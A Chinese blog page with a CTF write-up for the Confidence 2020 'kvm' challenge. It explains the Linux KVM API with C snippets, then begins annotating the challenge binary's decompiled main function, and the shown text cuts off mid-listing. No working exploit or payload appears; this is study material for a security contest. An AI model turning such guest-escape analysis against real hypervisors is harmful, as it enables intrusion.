<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>[Confidence CTF]kvm | C7</title><meta name="description" content="[Confidence CTF]kvm"><meta name="author" content="C7"><meta name="copyright" content="C7"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="twitter:card" content="summary"><meta name="twitter:title" content="[Confidence CTF]kvm"><meta name="twitter:description" content="[Confidence CTF]kvm"><meta name="twitter:image" content="https://i.loli.net/2020/10/05/OkMu26JEdRlGBqX.png"><meta property="og:type" content="article"><meta property="og:title" content="[Confidence CTF]kvm"><meta property="og:url" content="https://billyotry.github.io/2020/10/05/[Confidence%20CTF]kvm/"><meta property="og:site_name" content="C7"><meta property="og:description" content="[Confidence CTF]kvm"><meta property="og:image" content="https://i.loli.net/2020/10/05/OkMu26JEdRlGBqX.png"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Serif+SC:600&amp;display=swap"><link rel="stylesheet" href="/css/MonoFonts.addition.css"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>const autoChangeMode = 'true'
var t = Cookies.get("theme")
if (autoChangeMode == '1'){
  const isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
  const isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
  const isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
  const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

  if (t === undefined){
    if (isLightMode) activateLightMode()
    else if (isDarkMode) activateDarkMode()
    else if (isNotSpecified || hasNoSupport){
      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
      now = new Date();
      hour = now.getHours();
      isNight = hour < 6 || hour >= 18
      isNight ? activateDarkMode() : activateLightMode()
  }
  } else if (t == 'light') activateLightMode()
  else activateDarkMode()

} else if (autoChangeMode == '2'){
  now = new Date();
  hour = now.getHours();
  isNight = hour < 6 || hour >= 18
  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode() 
} else {
  if ( t == 'dark' ) activateDarkMode()
  else if ( t == 'light') activateLightMode()
}

function activateDarkMode(){
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null){
    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
  }
}
function activateLightMode(){
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null){
  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
  }
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="https://billyotry.github.io/2020/10/05/[Confidence%20CTF]kvm/"><link rel="next" title="【ASAN】简单使用指南" href="https://billyotry.github.io/2020/09/14/%E3%80%90ASAN%E3%80%91%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://xxx/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    title: 'Snackbar.bookmark.title',
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime_unit: '天',
  runtime: true,
  copyright: undefined,
  ClickShowText: undefined,
  medium_zoom: false,
  fancybox: true,
  Snackbar: undefined,
  baiduPush: true,
  highlightCopy: true,
  highlightLang: true,
  highlightShrink: false,
  isFontAwesomeV5: false
  
}</script><script>var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false
}</script><meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="C7" type="application/atom+xml">
<link rel="alternate" href="/rss2.xml" title="C7" type="application/rss+xml">
</head><body><canvas class="fireworks"></canvas><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">9</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">1</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> 放松</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music - 电影"></i><span> 音乐</span></a></li></ul></div></div></div></div><i class="fa fa-arrow-right on" id="toggle-sidebar" aria-hidden="true">     </i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Confidence2020-CTF-KVM"><span class="toc-number">1.</span> <span class="toc-text">Confidence2020 CTF KVM</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前置知识"><span class="toc-number">1.1.</span> <span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#构建虚拟机"><span class="toc-number">1.1.1.</span> <span class="toc-text">构建虚拟机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#创建一个虚拟机"><span class="toc-number">1.1.2.</span> <span class="toc-text">创建一个虚拟机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分配内存"><span class="toc-number">1.1.3.</span> <span class="toc-text">分配内存</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#创建虚拟CPU"><span class="toc-number">1.1.4.</span> <span class="toc-text">创建虚拟CPU</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#为CPU分配内存"><span class="toc-number">1.1.5.</span> <span class="toc-text">为CPU分配内存</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#设置标准和特殊寄存器"><span class="toc-number">1.1.6.</span> <span class="toc-text">设置标准和特殊寄存器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#开始运行"><span class="toc-number">1.1.7.</span> <span class="toc-text">开始运行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#处理退出"><span class="toc-number">1.1.8.</span> <span class="toc-text">处理退出</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题目分析"><span class="toc-number">1.2.</span> <span class="toc-text">题目分析</span></a></li></ol></li></ol></div></div></div><div id="body-wrap"><div id="web_bg" data-type="color"></div><div class="post-bg" id="nav" style="background-image: url(https://i.loli.net/2020/10/05/OkMu26JEdRlGBqX.png)"><div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">C7</a></span><span class="toggle-menu pull_right close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> 放松</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music - 电影"></i><span> 音乐</span></a></li></ul></div></div></span></div><div id="post-info"><div id="post-title"><div class="posttitle">[Confidence CTF]kvm</div></div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 发表于 2020-10-05<span class="post-meta__separator">|</span><i class="fa fa-history" aria-hidden="true"></i> 更新于 2020-10-05</time><div class="post-meta-wordcount"><div class="post-meta-pv-cv"><i class="fa fa-eye post-meta__icon" aria-hidden="true"> </i><span>阅读量:</span><span id="busuanzi_value_page_pv"></span></div></div></div></div></div><main class="layout_post" id="content-inner"><article id="post"><div id="article-container"><h1 id="Confidence2020-CTF-KVM"><a href="#Confidence2020-CTF-KVM" class="headerlink" title="Confidence2020 CTF KVM"></a>Confidence2020 CTF KVM</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>参考链接：<a href="https://lwn.net/Articles/658511/" target="_blank" rel="noopener">https://lwn.net/Articles/658511/</a></p>
<h3 id="构建虚拟机"><a href="#构建虚拟机" class="headerlink" title="构建虚拟机"></a>构建虚拟机</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kvm = <span class="built_in">open</span>(<span class="string">"/dev/kvm"</span>, O_RDWR | O_CLOEXEC);</span><br></pre></td></tr></table></figure>

<p>我们需要对设备的读写访问来设置虚拟机，并且所有打开不是明确打算跨<code>exec</code>继承的，应使用 <code>O_CLOEXEC</code>。</p>
<h3 id="创建一个虚拟机"><a href="#创建一个虚拟机" class="headerlink" title="创建一个虚拟机"></a>创建一个虚拟机</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">vmfd = ioctl(kvm, KVM_CREATE_VM, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>现在创建一个虚拟机，它代表与模拟出来的系统所有相关联的内容，包括内存，一或多个CPU。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">int ioctl(int fd, ind cmd, …)；</span><br></pre></td></tr></table></figure>

<p><strong>ioctl</strong> 是设备驱动程序中对设备I/O通道进行管理的函数。所谓对I/O通道进行管理，就是对设备的一些特性进行控制，例如串口的传输波特率、马达的转速等等。</p>
<ul>
<li><strong>fd</strong> 是用户程序打开设备时使用<strong>open函数返回的文件标示符</strong>。</li>
<li><strong>cmd</strong> 是用户程序对设备的控制命令。</li>
<li><strong>省略号</strong>是一些补充参数，一般最多一个，这个参数的有无和cmd的意义相关。</li>
</ul>
<h3 id="分配内存"><a href="#分配内存" class="headerlink" title="分配内存"></a>分配内存</h3><p>现在虚拟机需要分配一些内存。<strong>分配的内存就相当于虚拟机的物理内存</strong>，为了提高性能，我们不想捕获所有对于内存的访问并且模拟的返回它对应的地址；相反的是，当虚拟CPU试图访问内存的时候，CPU的硬件虚拟化会首先对尝试通过设置的内存页表来满足对内存的访问，如果失败了（由于虚拟机访问的是”物理”地址，而内存没有映射到该地址），那么内核就会使用KVM API 来处理这个访问，例如通过模拟内存映射的I/O设备或者产生一个错误。</p>
<p>对于我们的例子，我们分配了单独的页来存放我们的代码，使用mmap()直接获得初始化为0的页面对齐的内存</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mem = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>我们需要复制我们的机器代码到这个分配的空间内：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(mem, code, <span class="keyword">sizeof</span>(code));</span><br></pre></td></tr></table></figure>

<p>然后告诉虚拟机它有足够大的4096个字节的内存：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kvm_userspace_memory_region</span> <span class="title">region</span> = &#123;</span></span><br><span class="line">	.slot = <span class="number">0</span>,</span><br><span class="line">	.guest_phys_addr = <span class="number">0x1000</span>,</span><br><span class="line">	.memory_size = <span class="number">0x1000</span>,</span><br><span class="line">	.userspace_addr = (<span class="keyword">uint64_t</span>)mem,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">ioctl(vmfd, KVM_SET_USER_MEMORY_REGION, &amp;region);</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>slot</strong> 字段提供了一个整数索引，用于标识我们要移交给KVM的每个内存区域，再次使用相同的 slot 调用KVM_SET_USER_MEMORY_REGION将替换此映射，如果使用不同的 slot 就会创建一个新的单独的映射。</li>
<li><strong>guest_phys_addr</strong> 字段指定物理地址的基址。</li>
<li><strong>memory_size</strong> 字段指定我们要分配多大的内存。</li>
<li><strong>userspace_addr</strong> 字段指向我们使用mmap() 分配的后备内存，需要注意的是这个值总是64位的即使在32位平台上也是64位的，还有一点就是这里要求 mem 是页对齐的，这也就是为什么上面mmap的时候要分配一个页对齐的页。 </li>
</ul>
<h3 id="创建虚拟CPU"><a href="#创建虚拟CPU" class="headerlink" title="创建虚拟CPU"></a>创建虚拟CPU</h3><p>现在我们有一个VM并且VM中包含我们的代码，并且代码正等待运行，所以我们需要一个虚拟CPU来运行代码，KVM的虚拟CPU代表模拟CPU的状态，包括进程寄存器和其他的执行状态。</p>
<p>同样，KVM以文件描述符的形式为我们提供该VCPU的句柄：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">vcpufd = ioctl(vmfd, KVM_CREATE_VCPU, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>第三个参数 0 代表虚拟CPU的索引，具有多个CPU的VM将在此处分配一系列标识符，从0到系统特定的限制（可通过使用KVM_CHECK_EXTENSION检查KVM_CAP_MAX_VCPUS功能来获得）</p>
<h3 id="为CPU分配内存"><a href="#为CPU分配内存" class="headerlink" title="为CPU分配内存"></a>为CPU分配内存</h3><p>每个CPU都有一个关联的<code>struct kvm_run</code>的数据结构，用于CPU在内核和用户空间的信息交换，特别是，无论何时硬件虚拟化停止了，例如模拟的一些虚拟硬件，<code>kvm_run</code>结构将会包含为什么停止的信息，我们使用mmap映射它到用户内存空间内，但是首先我们需要知道分配多少内存，KVM通过KVM_GET_VCPU_MMAP_SIZE ioctl来告诉我们</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mmap_size = ioctl(kvm, KVM_GET_VCPU_MMAP_SIZE, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>

<p>需要注意的是分配的内存通常都是大于<code>kvm_run</code>的大小的，因为内核还将使用该空间来存储<code>kvm_run</code>可能指向的其他瞬时结构。</p>
<p>现在我们已经知道了应该分配的size，我们可以使用mmap来映射这个<code>kvm_run</code>结构了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">run</span> = mmap(<span class="literal">NULL</span>, mmap_size, PROT_READ | PROT_WRITE, MAP_SHARED, vcpufd, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<h3 id="设置标准和特殊寄存器"><a href="#设置标准和特殊寄存器" class="headerlink" title="设置标准和特殊寄存器"></a>设置标准和特殊寄存器</h3><p>VCPU也包含进程的寄存器状态，分为两组寄存器，一组是标准寄存器，一组是特殊寄存器。这两种寄存器对印这两个特定体系的数据结构 <code>struct kvm_regs</code> 和 <code>struct kvm_sregs</code>。在x86上，标准寄存器包括通用寄存器以及指令指针和标志。”特殊”寄存器主要包括段寄存器和控制寄存器。</p>
<p>在我们开始运行我们的代码之前，我们应该要先初始化这些寄存器，对于特殊寄存器我们只需要更改 cs 段寄存器，cs 段寄存器的默认状态（以及初始指令指针）指向复位向量，位于内存顶部下方16个字节处，但我们希望 cs 改为指向0，<code>kvm_sregs</code>中的每个段都包含一个完整的段描述符；我们不需要更改各种标志或限制，但是我们将 cs 的 base 和 selector 归零，这两个字段共同确定段指向的内存地址。为了避免更改任何其他初始”特殊”寄存器状态，我们将其读出，更改 cs 并将其写回：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ioctl(vcpufd, KVM_GET_SREGS, &amp;sregs);</span><br><span class="line">sregs.cs.base = <span class="number">0</span>;</span><br><span class="line">sregs.cs.selector = <span class="number">0</span>;</span><br><span class="line">ioctl(vcpufd, KVM_SET_SREGS, &amp;sregs);</span><br></pre></td></tr></table></figure>

<p>对于标准寄存器，除了初始指令指针（指向代码0x1000，相对于 cs 指向0），加数（2和2）以及标志的初始状态（由x86架构指定为0x2；如果未设置此选项，则启动VM将会失败）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kvm_regs</span> <span class="title">regs</span> = &#123;</span></span><br><span class="line">	.rip = <span class="number">0x1000</span>,</span><br><span class="line">	.rax = <span class="number">2</span>,</span><br><span class="line">	.rbx = <span class="number">2</span>,</span><br><span class="line">	.rflags = <span class="number">0x2</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">ioctl(vcpufd, KVM_SET_REGS, &amp;regs);</span><br></pre></td></tr></table></figure>

<h3 id="开始运行"><a href="#开始运行" class="headerlink" title="开始运行"></a>开始运行</h3><p>现在我们VM和VCPU以及初始化好了，内存映射也初始化好了，寄存器也都初始化好了，现在可以使用<code>kvm_run ioctl()</code>运行代码了，每当虚拟化停止时，这将成功返回，例如让我们模拟硬件，因此我们将其循环运行。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">	ioctl(vcpufd, KVM_RUN, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">switch</span> (<span class="built_in">run</span>-&gt;exit_reason) &#123;</span><br><span class="line">	<span class="comment">/* Handle exit */</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意，<code>KVM_RUN</code>在当前进程的上下文运行VM，并且知道仿真停止后才返回。要运行多个VM，用户空间进程必须产生多个线程，并为不同线程中的不同虚拟CPU调用<code>KVM_RUN</code>。</p>
<h3 id="处理退出"><a href="#处理退出" class="headerlink" title="处理退出"></a>处理退出</h3><p>我们通过检测<code>run-&gt;exit_reason</code>来看为什么退出，<code>run-&gt;exit_reason</code>包含了数十个退出原因中的一个，对应与<code>kvm_run</code>中联合的不同分支。</p>
<p>对于这个简单的VM，我们只处理其中的几个，并将其他的<code>exit_reason</code>视为错误。</p>
<p>我们将暂停视为以及结束的标志</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> KVM_EXIT_HLT:</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"KVM_EXIT_HLT"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>为了让虚拟代码输出结果，我们在I/O端口0x3f8上模拟了一个串行端口。 run-&gt; io中的字段指示方向（输入或输出），大小（1、2或4），端口和值的数量。为了传递实际数据，内核使用在kvm_run结构之后映射的缓冲区，并且run-&gt; io.data_offset提供从该映射开始的偏移量。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> KVM_EXIT_IO:</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">run</span>-&gt;io.direction == KVM_EXIT_IO_OUT &amp;&amp;</span><br><span class="line">			<span class="built_in">run</span>-&gt;io.<span class="built_in">size</span> == <span class="number">1</span> &amp;&amp;</span><br><span class="line">			<span class="built_in">run</span>-&gt;io.port == <span class="number">0x3f8</span> &amp;&amp;</span><br><span class="line">			<span class="built_in">run</span>-&gt;io.count == <span class="number">1</span>)</span><br><span class="line">		<span class="built_in">putchar</span>(*(((<span class="keyword">char</span> *)<span class="built_in">run</span>) + <span class="built_in">run</span>-&gt;io.data_offset));</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		errx(<span class="number">1</span>, <span class="string">"unhandled KVM_EXIT_IO"</span>);</span><br><span class="line">	<span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>为了简化调试设置和运行VM的过程，我们处理了一些常见的错误。特别是，KVM_EXIT_FAIL_ENTRY在更改VM的初始条件时经常显示；这表明底层硬件虚拟化机制（在这种情况下为VT）无法启动VM，因为初始条件不符合其要求。 （在其他原因中，如果标志寄存器未设置0x2位，或者段或任务切换寄存器的初始值未通过各种设置条件，则将发生此错误。）hardware_entry_failure_reason实际上并不能区分很多情况，因此，此类错误通常需要仔细阅读硬件文档。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> KVM_EXIT_FAIL_ENTRY:</span><br><span class="line">	errx(<span class="number">1</span>, <span class="string">"KVM_EXIT_FAIL_ENTRY: hardware_entry_failure_reason = 0x%llx"</span>,</span><br><span class="line">		(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)<span class="built_in">run</span>-&gt;fail_entry.hardware_entry_failure_reason);</span><br></pre></td></tr></table></figure>

<p>当我们将所有这些放到示例代码中，对其进行构建并运行时，我们得到以下信息：</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">$ ./kvmtest</span><br><span class="line"><span class="number">4</span></span><br><span class="line">KVM_EXIT_HLT</span><br></pre></td></tr></table></figure>

<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> errno_kvm; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> errno_create_kvm; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> errno_set_user_memory; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> errno_create_vcpu; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> errno_set_regs; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> errno_get_sregs; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> errno_set_sregs; <span class="comment">// eax</span></span><br><span class="line">  __u32 exit_reason; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> code_size; <span class="comment">// [rsp+Ch] [rbp-8274h]</span></span><br><span class="line">  <span class="keyword">int</span> kvmfd; <span class="comment">// [rsp+10h] [rbp-8270h]</span></span><br><span class="line">  <span class="keyword">int</span> vmfd; <span class="comment">// [rsp+14h] [rbp-826Ch]</span></span><br><span class="line">  <span class="keyword">int</span> vcpu; <span class="comment">// [rsp+18h] [rbp-8268h]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+1Ch] [rbp-8264h]</span></span><br><span class="line">  <span class="keyword">char</span> *aligned_guest_mem; <span class="comment">// [rsp+20h] [rbp-8260h]</span></span><br><span class="line">  <span class="keyword">size_t</span> vcpu_mmap_size; <span class="comment">// [rsp+28h] [rbp-8258h]</span></span><br><span class="line">  kvm_run *run_mem; <span class="comment">// [rsp+30h] [rbp-8250h]</span></span><br><span class="line">  __int64 v20; <span class="comment">// [rsp+38h] [rbp-8248h]</span></span><br><span class="line">  __int64 v21; <span class="comment">// [rsp+40h] [rbp-8240h]</span></span><br><span class="line">  __int64 v22; <span class="comment">// [rsp+48h] [rbp-8238h]</span></span><br><span class="line">  __u64 v23; <span class="comment">// [rsp+50h] [rbp-8230h]</span></span><br><span class="line">  __u64 v24; <span class="comment">// [rsp+58h] [rbp-8228h]</span></span><br><span class="line">  __int64 v25; <span class="comment">// [rsp+60h] [rbp-8220h]</span></span><br><span class="line">  __int64 v26; <span class="comment">// [rsp+68h] [rbp-8218h]</span></span><br><span class="line">  __int64 v27; <span class="comment">// [rsp+70h] [rbp-8210h]</span></span><br><span class="line">  kvm_userspace_memory_region region; <span class="comment">// [rsp+80h] [rbp-8200h]</span></span><br><span class="line">  kvm_regs guest_regs; <span class="comment">// [rsp+A0h] [rbp-81E0h]</span></span><br><span class="line">  kvm_sregs guest_sregs; <span class="comment">// [rsp+130h] [rbp-8150h]</span></span><br><span class="line">  <span class="keyword">char</span> guest_mem[<span class="number">32776</span>]; <span class="comment">// [rsp+270h] [rbp-8010h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v32; <span class="comment">// [rsp+8278h] [rbp-8h]</span></span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+8280h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  v32 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(guest_mem, <span class="number">0</span>, <span class="number">0x8000</span>uLL);</span><br><span class="line">  aligned_guest_mem = &amp;guest_mem[<span class="number">4096L</span>L - ((&amp;savedregs + <span class="number">0x7FF0</span>) &amp; <span class="number">0xFFF</span>)];<span class="comment">// </span></span><br><span class="line">                                                <span class="comment">// 经过动调发现savedregs+0x7ff0其实就是刚才memset里面s的位置</span></span><br><span class="line">                                                <span class="comment">// 然后((&amp;savedregs + 0x7ff0) &amp; 0xfff)就是取s的地址的低3位</span></span><br><span class="line">                                                <span class="comment">// 然后用0x1000减掉低三位得到一个值,这个值也就是地址加多少可以取到最近的整数</span></span><br><span class="line">                                                <span class="comment">// 所以说这里的功能是让aligned_guest_mem取整</span></span><br><span class="line">                                                <span class="comment">// 举个例子就是假如guest_mem的起始地址为0x7fffffff5c50</span></span><br><span class="line">                                                <span class="comment">// 让他取整就是取到0x7fffffff6000</span></span><br><span class="line">  code_size = <span class="number">-1</span>;</span><br><span class="line">  read_n(<span class="number">4L</span>L, &amp;code_size);                      <span class="comment">// 这里需要输入的字符转成对应的数字需要小于0x4000,所以说输入的就应该是\x00\x40\x00\x00</span></span><br><span class="line">  <span class="keyword">if</span> ( code_size &lt;= <span class="number">0x4000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    read_n(code_size, aligned_guest_mem);       <span class="comment">// 如果按照上面咱们输入的\x00\x40\x00\x00的话,咱们就需要输入0x4000个字符</span></span><br><span class="line">                                                <span class="comment">// 然后这些字符存储到aligned_guest_mem中</span></span><br><span class="line">    kvmfd = <span class="built_in">open</span>(<span class="string">"/dev/kvm"</span>, <span class="number">0x80002</span>);</span><br><span class="line">    <span class="keyword">if</span> ( kvmfd &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      errno_kvm = <span class="built_in">open</span>(<span class="string">"/dev/kvm"</span>, <span class="number">0x80002</span>);</span><br><span class="line">      kvmfd = errno_kvm;</span><br><span class="line">      err(errno_kvm, <span class="string">"fail line: %d"</span>, <span class="number">40L</span>L);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 0xAE01 : KVM_CREATE_VM</span></span><br><span class="line">    vmfd = ioctl(kvmfd, <span class="number">0xAE01</span>uLL, <span class="number">0L</span>L);        <span class="comment">// 创建虚拟机，获取到虚拟机句柄</span></span><br><span class="line">    <span class="keyword">if</span> ( vmfd &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      errno_create_kvm = ioctl(kvmfd, <span class="number">0xAE01</span>uLL, <span class="number">0L</span>L);</span><br><span class="line">      vmfd = errno_create_kvm;</span><br><span class="line">      err(errno_create_kvm, <span class="string">"fail line: %d"</span>, <span class="number">43L</span>L);</span><br><span class="line">    &#125;</span><br><span class="line">    region.slot = <span class="number">0L</span>L;</span><br><span class="line">    region.guest_phys_addr = <span class="number">0L</span>L;</span><br><span class="line">    region.memory_size = <span class="number">0x8000</span>LL;</span><br><span class="line">    region.userspace_addr = aligned_guest_mem;</span><br><span class="line">    <span class="comment">// 0x4020ae46 : KVM_SET_USER_MEMORY_REGION</span></span><br><span class="line">    <span class="keyword">if</span> ( ioctl(vmfd, <span class="number">0x4020AE46</span>uLL, &amp;region) &lt; <span class="number">0</span> )<span class="comment">// 为虚拟机映射内存,还有其他的PCI,信号处理的初始化</span></span><br><span 